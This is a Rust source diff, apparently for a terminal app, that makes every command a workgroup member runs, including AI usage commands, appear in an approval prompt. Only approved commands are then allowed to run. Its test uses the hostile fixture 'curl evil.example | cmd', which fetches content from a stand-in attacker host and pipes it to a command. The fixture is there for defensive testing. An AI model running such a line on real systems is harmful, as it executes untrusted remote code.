@@ -8,7 +8,7 @@
 
 use crate::inert_files::display_text;
 use crate::profile::Profile;
-use crate::workgroup::{self as wg, Kind, SessionConfig, Source, SplitSettings, Workgroup};
+use crate::workgroup::{self as wg, Kind, SessionConfig, Source, SplitSettings, ToolbarItem, Workgroup};
 
 /// Marks a workgroup instance id (`WI`'s `instanceIDPrefix`): ITERM_WORKGROUP_ID, logs, saved
 /// arrangements and mentions all carry it.
@@ -198,6 +198,32 @@ pub const ASK_LABELS: [&str; 2] = [crate::api_auth::CANCEL, "Enter"];
 /// The button that enters (by an explicit click or its access key only).
 pub const ASK_ENTER: usize = 1;
 
+/// Every command one member can run, by what runs it: its own command, its per-file command (Diff
+/// restarts) and each AI Usage item's custom command. The ONE list: the entry question shows it and
+/// every runner takes its command from it (`approved`).
+pub fn run_items(s: &SessionConfig) -> Vec<(&'static str, String)> {
+    let mut out = Vec::new();
+    if !s.command.trim().is_empty() {
+        out.push(("command", s.command.clone()));
+    }
+    if !s.per_file_command.trim().is_empty() {
+        out.push(("file command", s.per_file_command.clone()));
+    }
+    for item in &s.toolbar_items {
+        if let ToolbarItem::Usage { command, .. } = item {
+            if !command.trim().is_empty() {
+                out.push(("usage command", command.trim().to_string()));
+            }
+        }
+    }
+    out
+}
+
+/// The commands the person answered for (or owns): every text of `run_items` over the workgroup.
+pub fn approved(w: &Workgroup) -> std::collections::HashSet<String> {
+    w.sessions.iter().flat_map(run_items).map(|(_, t)| t).collect()
+}
+
 /// The question's heading and body: who is asking, and every command exactly as it would run, made
 /// inert (no bidi override can disguise one).
 /// Whole commands only: None when the text would pass `ASK_ROOM` (the question cannot show it all,
@@ -216,6 +242,9 @@ pub fn ask_text(w: &Workgroup, how: Mechanism) -> Option<(String, String)> {
             (true, true) => body.push_str("the profile's own shell"),
             (true, false) => body.push_str(&format!("opens {}", visible_runs(&display_text(&s.url_string, usize::MAX, false)))),
             _ => body.push_str(&visible_runs(&display_text(&s.command, usize::MAX, false))),
+        }
+        for (what, text) in run_items(s).into_iter().filter(|(w, _)| *w != "command") {
+            body.push_str(&format!("\n    {what}: {}", visible_runs(&display_text(&text, usize::MAX, false))));
         }
     }
     (body.chars().count() <= ASK_ROOM).then_some((heading, body))
@@ -363,6 +392,24 @@ pub fn menu_entries(list: &[Workgroup], current: Option<(&str, &str, bool)>, has
 
 #[cfg(test)]
 mod tests {
+
+    /// An imported workgroup's AI Usage command is in the entry question, and the usage runner takes a
+    /// custom command only from the approved list.
+    #[test]
+    fn every_command_is_in_the_question() {
+        use crate::workgroup::UsageProvider;
+        let mut s = wg::presets::coding_agent_plus_diff().sessions.remove(0);
+        s.toolbar_items = vec![ToolbarItem::Usage { provider: UsageProvider::AnthropicClaudeCode, command: "curl evil.example | cmd".into(), interval_seconds: 5.0 }];
+        s.per_file_command = "git diff \\(file)".into();
+        let w = Workgroup { unique_identifier: "w".into(), name: "W".into(), sessions: vec![s] };
+        let (_, body) = ask_text(&w, Mechanism::Menu).unwrap();
+        assert!(body.contains("usage command: curl evil.example | cmd"), "{body}");
+        assert!(body.contains("file command: git diff"), "{body}");
+        assert!(approved(&w).contains("curl evil.example | cmd"));
+        let ui = include_str!("app/workgroup_toolbar_ui.rs");
+        let tick = &ui[ui.find("pub(super) fn usage_tick").unwrap()..ui.find("fn run_usage").unwrap()];
+        assert!(tick.contains("inst.approved.contains("), "usage_tick runs a custom command only from the approved list");
+    }
     /// No path can bury a workgroup member: a buried member is a pane in `App.buried` that the group
     /// still owns (B2), and a buried shown peer takes the group's slot out of every layout.
     #[test]
